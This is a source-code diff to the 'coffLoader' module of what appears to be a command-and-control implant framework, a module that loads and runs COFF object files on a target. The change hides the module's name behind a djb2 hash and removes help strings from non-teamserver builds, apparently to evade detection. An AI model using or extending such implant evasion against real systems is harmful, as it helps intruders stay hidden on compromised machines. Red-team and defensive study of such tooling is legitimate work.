@@ -22,7 +22,8 @@ extern "C"
 using namespace std;
 
 
-const std::string moduleName = "coffLoader";
+constexpr std::string_view moduleName = "coffLoader";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -35,7 +36,11 @@ __declspec(dllexport) CoffLoader* A_CoffLoaderConstructor()
 #endif
 
 CoffLoader::CoffLoader()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -46,13 +51,14 @@ CoffLoader::~CoffLoader()
 std::string CoffLoader::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "coffLoader:\n";
 	info += "Load a .o coff file and execute it.\n";
     info += "Coff take packed argument as entry, you get to specify the type as a string of [Z,z,s,i] for wstring, string, short, int.\n";
 	info += "exemple:\n";
 	info += "- coffLoader ./dir.x64.o go Zs c:\\ 0\n";
     info += "- coffLoader ./whoami.x64.o\n";
-
+#endif
 	return info;
 }
 
@@ -115,7 +121,7 @@ int CoffLoader::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 	std::string result = coffLoader(payload, functionName, args);
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_returnvalue(result);
 
 	return 0;
